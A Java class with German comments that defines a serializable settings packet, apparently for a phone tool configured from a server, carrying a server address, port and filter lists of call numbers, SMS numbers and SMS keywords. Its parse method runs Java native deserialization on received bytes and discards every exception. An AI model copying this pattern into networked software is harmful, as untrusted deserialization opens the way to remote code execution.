package Packet;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.ArrayList;

/**
 * Diese Paket ist zur Übertragung der Einstellung da.
 */
public class PreferencePacket implements Packet, Serializable{

	private static final long serialVersionUID = 4434667156231031L;
	/**
	 * ip	Die Ip des Servers
	 */
	String ip;
	/**
	 * port	Der Port des Servers
	 */
	int port;
	/**
	 * waitTrigger 	Der waitTrigger
	 */
	boolean waitTrigger;
	/**
	 * phoneNumberCall	Filterliste über Telefonnummern
	 */
	ArrayList<String> phoneNumberCall;
	/**
	 * phoneNumberSMS	Filterliste für Smsnummern
	 */
	ArrayList<String> phoneNumberSMS;
	/**
	 * keywordSMS Filterliste für SMSSchlüsselwörter
	 */
	ArrayList<String> keywordSMS;
	
	public PreferencePacket() {
		
	}

	/**
	 *	Der Kostruktor weißt die erhaltenen Daten den enstprechenden Klassenvariablen zu.
	 * @param ip	Die IP des Servers
	 * @param port	Der Port des Servers
	 * @param wait	Der waitTrigger
	 * @param phones	Die Telefonnummernfilterliste
	 * @param sms	Die Smsnummernfilterliste
	 * @param kw	Die Schlüsselwortfilterliste
	 */
	public PreferencePacket(String ip, int port, boolean wait, ArrayList<String> phones, ArrayList<String> sms, ArrayList<String> kw) {
		this.ip = ip;
		this.port = port;
		this.waitTrigger = wait;
		this.phoneNumberCall = phones;
		this.phoneNumberSMS = sms;
		this.keywordSMS = kw;
	}

	/**
	 * Erstellt aus den Daten des Pakets ein byte-Array
	 * @return byte-Array welches die Daten des Pakets beinhaltet
	 */
	public byte[] build() {
		try {
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			ObjectOutputStream out = new ObjectOutputStream(bos);
			out.writeObject(this);
			return bos.toByteArray();
		} catch (IOException e) {
			return null;
		}
	}

	/**
	 * Erhält ein byte-Array mit den Einstellungsdaten und extrahiert diese aus dem byte-Array
	 * @param packet Ein Paket mit den Daten des byte-Arrays
	 */
	public void parse(byte[] packet) {
		ByteArrayInputStream bis = new ByteArrayInputStream(packet);
		ObjectInputStream in;
		try {
			in = new ObjectInputStream(bis);
			PreferencePacket p = (PreferencePacket) in.readObject();
			setIp(p.getIp());
			setPort(p.getPort());
			setWaitTrigger(p.isWaitTrigger());
			setPhoneNumberCall(p.getPhoneNumberCall());
			setPhoneNumberSMS(p.getPhoneNumberSMS());
			setKeywordSMS(p.getKeywordSMS());
		} catch (Exception e) {
		}
	}

	/**
	 * Liefert die Serverip
	 * @return	Serverip
	 */
	public String getIp() {
		return ip;
	}

	/**
	 * Setzt die Serverip
	 * @param ip	Serverip
	 */
	public void setIp(String ip) {
		this.ip = ip;
	}

	/**
	 * Liefert den Port des Servers
	 * @return	Port des Servers
	 */
	public int getPort() {
		return port;
	}

	/**
	 * Setzt den Port des Servers
	 * @param port	Port des Servers
	 */
	public void setPort(int port) {
		this.port = port;
	}

	/**
	 * Liefert den waitTrigger
	 * @return	waitTrigger
	 */
	public boolean isWaitTrigger() {
		return waitTrigger;
	}

	/**
	 * Setzt den waitTrigger
	 * @param waitTrigger	waitTrigger
	 */
	public void setWaitTrigger(boolean waitTrigger) {
		this.waitTrigger = waitTrigger;
	}

	/**
	 * Liefert die Telefonnummernfilterliste
	 * @return Telefonnummernfilterliste
	 */
	public ArrayList<String> getPhoneNumberCall() {
		return phoneNumberCall;
	}

	/**
	 * Setzt die Telefonnummernfilterliste
	 * @param phoneNumberCall	Telefonnummernfilterliste
	 */
	public void setPhoneNumberCall(ArrayList<String> phoneNumberCall) {
		this.phoneNumberCall = phoneNumberCall;
	}

	/**
	 * Liefert die SMSFilterliste
	 * @return	SMSFilterliste
	 */
	public ArrayList<String> getPhoneNumberSMS() {
		return phoneNumberSMS;
	}

	/**
	 * Setzt die SMSFilterliste
	 * @param phoneNumberSMS	SMSFilterliste
	 */
	public void setPhoneNumberSMS(ArrayList<String> phoneNumberSMS) {
		this.phoneNumberSMS = phoneNumberSMS;
	}

	/**
	 * Liefert die Schlüsselwortliste
	 * @return	Schlüsselwortliste
	 */
	public ArrayList<String> getKeywordSMS() {
		return keywordSMS;
	}

	/**
	 * Setzz die Schlüsselwortliste
	 * @param keywordSMS	Schlüsselwortliste
	 */
	public void setKeywordSMS(ArrayList<String> keywordSMS) {
		this.keywordSMS = keywordSMS;
	}
}
